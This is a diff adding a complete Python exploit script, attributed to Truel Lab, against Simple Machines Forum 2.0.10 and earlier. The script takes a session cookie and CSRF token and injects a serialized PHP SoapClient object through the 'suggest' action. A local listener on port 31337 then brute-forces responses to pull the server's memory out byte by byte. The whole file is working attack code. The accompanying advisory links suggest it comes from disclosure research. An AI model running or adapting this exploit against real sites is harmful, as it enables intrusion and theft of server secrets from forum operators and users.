@@ -1,0 +1,232 @@
+#!/usr/bin/python
+# -*- coding: iso-8859-15 -*-
+
+#############################################################################
+# Title:    	SMF (Simple Machine Forum) <= 2.0.10 Remote Memory Exfiltration Exploit
+# Authors:  	Andrea Palazzo  
+#					<andrea [dot] palazzo [at] truel [dot] it> 
+#           	Filippo Roncari 
+#					<filippo [dot] roncari [at] truel [dot] it>
+#           	Truel Lab ~ http://lab.truel.it
+# Requirements:	SMF <= 2.0.10
+#				PHP <= 5.6.11 / 5.5.27 / 5.4.43
+# Advisories:	TL-2015-PHP04 http://lab.truel.it/d/advisories/TL-2015-PHP04.txt
+#				TL-2015-PHP06 http://lab.truel.it/d/advisories/TL-2015-PHP06.txt
+#				TL-2015-SMF01 n/y/a
+# Details:		http://lab.truel.it/2015/09/php-object-injection-the-dirty-way/
+# Demo: 		https://www.youtube.com/watch?v=dNRXTt7XQxs
+############################################################################
+
+
+import sys, requests, time, os, socket, thread, base64, string, urllib
+from multiprocessing import Process
+
+#Payload Config
+bytes_num = 000 #num of bytes to dump
+address = 000 #starting memory address
+
+#Target Config
+cookie = {'PHPSESSID' : '000'} #SMF session cookie
+target_host = 'http://localhost/smf/index.php' #URL of target installation index.php
+csrftoken = ''
+
+#Local Server Config
+host = "localhost"
+port = 31337
+
+#Memory dump variables 
+dumped = ''
+current_dump = ''
+in_string = False
+brute_index = 0
+brute_list = list(string.ascii_letters + string.digits)
+r_ok = 'HTTP/1.0 200 OK' + '\n'
+r_re = 'HTTP/1.0 302 OK' + '\n'
+r_body = '''Server: Truel-Server
+Content-Type: text/xml
+Connection: keep-alive
+Content-Length: 395
+
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope">
+ <env:Header>
+  <n:alertcontrol xmlns:n="http://example.org/alertcontrol">
+   <n:priority>1</n:priority>
+   <n:expires>2001-06-22T14:00:00-05:00</n:expires>
+  </n:alertcontrol>
+ </env:Header>
+ <env:Body>
+  <m:alert xmlns:m="http://example.org/alert">
+   <m:msg>Truel</m:msg>
+  </m:alert>
+ </env:Body>
+</env:Envelope>'''
+
+
+def serverStart():
+	print "[+] Setting up local server on port " + str(port)
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	if not sock:
+		print "[X] Fatal Error: Unable to create socket"
+	sock.bind((host, port))
+	sock.listen(1) 
+	return sock
+
+def getToken():
+	global csrftoken
+	print "[+] Trying to get a valid CSRF token"
+	for n in range(3): #3 attempts
+		r = requests.get(target_host, cookies=cookie, allow_redirects=False)
+		r = r.text
+		if(r.find("action=logout;")!=-1):
+			break
+	start = r.find("action=logout;")
+	if (start !=-1):
+		end = (r[start+14:]).find('">')
+		csrftoken = r[start+14 : start+end+14]
+		print "[+] Authentication done. Got token " + str(csrftoken)
+		return True
+	else:
+		print "[X] Fatal Error: You are not authenticated. Check the provided PHPSESSID."
+		return False
+
+def prepareForExploit():
+	if not(getToken()): #get CSRF token
+		os._exit(1)
+	target = target_host + '?action=suggest&' + csrftoken + '&search_param=test' 
+ 	r = requests.get(target, cookies=cookie, allow_redirects=False) #necessary request
+ 	return
+
+def forgePayload(current_try, address):
+	location = "http://" + current_try
+	payload = 'O:12:"DateInterval":1:{s:14:"special_amount";O:9:"Exception":1:{s:19:"\x00Exception\x00previous";O:10:"SoapClient":5:{s:3:"uri";s:1:"a";s:8:"location";s:' + str(len(location)) + ':"' + location + '";s:8:"_cookies";a:1:{s:5:"owned";a:3:{i:0;s:1:"a";i:2;i:' + str(address) + ';i:1;i:' + str(address) + ';}}s:11:"_proxy_host";s:' + str(len(host)) + ':"' + str(host) + '";s:11:"_proxy_port";i:' + str(port) + ';}}}'
+	return payload
+
+def sendPayload(payload,null):
+ 	target = target_host + '?action=suggest&' + csrftoken + '&search_param=' + (base64.b64encode(payload)) #where injection happens
+ 	try:
+		r = requests.get(target, cookies=cookie, allow_redirects=False)
+	except requests.exceptions.RequestException:    
+		print "[X] Fatal Error: Unable to reach the remote host (Connection Refuse)"
+		os._exit(1) 
+	return 
+
+def limitReached(dumped):
+	if(len(dumped) >= bytes_num):
+		return True
+	else:
+		return False
+
+def printDumped(dumped):
+	d = "    "
+	cnt = 1
+	print "[+] " + str(len(dumped)) + " bytes dumped from " + target_host
+	print "[+] ======================= Dumped Data ======================="
+	for i in range(bytes_num):
+		d = d + str(dumped[i])
+		if (cnt % 48 == 0):
+			print d 
+			d = "    "
+		if (cnt == bytes_num):
+			print d
+		cnt = cnt + 1
+
+def getSoapRequest(sock):
+	connection, sender = sock.accept()
+	request = connection.recv(8192) 
+	return (connection, request)
+
+def sendSoapResponse(connection, content):
+	connection.send(content)
+	connection.close()
+	return
+
+def getDumpedFromHost(request):
+	i = request.find("Host: ") + 6
+	v = request[i:i+1]
+	return v
+
+def pushDumped(value, string):
+	global dumped
+	global current_dump
+	global brute_index
+	global address
+	global in_string
+
+	dumped = str(value) + str(dumped) 
+	if(string):
+		current_dump = str(value) + str(current_dump)
+	else:
+		current_dump = ""
+	in_string = string
+	address = address-1
+	brute_index = 0
+	print "[" + hex(address) + "] " + str(value)
+	return
+
+def bruteViaResponse(sock):
+	global brute_index
+	current_try = ""
+	response_ok = r_ok + r_body
+
+	for n in range(19):
+		connection, request = getSoapRequest(sock)
+		if not request:
+			connection.close()
+			return False
+		if request.find("owned")!=-1:
+			pushDumped(getDumpedFromHost(request), True)
+			sendSoapResponse(connection,response_ok)
+			return True
+		else:
+			if((brute_index+1) == len(brute_list)):
+				sendSoapResponse(connection,response_ok)
+				return False
+			brute_index = brute_index + 1
+		if not in_string:
+			current_try = brute_list[brute_index]
+		else:
+			current_try = brute_list[brute_index] + str(current_dump)
+		response_re = r_re + 'Location: http://' + str(current_try) + '\n' + r_body
+		sendSoapResponse(connection,response_re)
+	connection, request = getSoapRequest(sock)
+	if request.find("owned")!=-1:
+		pushDumped(getDumpedFromHost(request), True)
+		sendSoapResponse(connection,response_ok)
+		return True
+	sendSoapResponse(connection,response_ok)
+	return False
+
+def bruteViaRequest(sock):
+	global brute_index
+	brute_index = 0
+	current_try = ""
+
+	while(True):	
+		if(brute_index == len(brute_list)):
+			pushDumped(".", False)
+		if limitReached(dumped):
+			printDumped(dumped)
+			return 
+		if not in_string:
+			current_try = brute_list[brute_index]
+		else:
+			current_try = brute_list[brute_index] + str(current_dump)
+		payload = forgePayload(current_try,address)
+		thread.start_new_thread(sendPayload,(payload,""))
+		if not bruteViaResponse(sock):
+			brute_index = brute_index + 1
+	return  
+
+def runExploit():
+	print "[+] Starting exploit"
+	sock = serverStart()
+	prepareForExploit()
+	print "[+] Trying to dump " + str(bytes_num) + " bytes from " + str(target_host)
+	bruteViaRequest(sock)
+	sock.close()
+	print "[+] Bye ~ Truel Lab (http://lab.truel.it)"
+	sys.exit(0)
+
+
+runExploit()
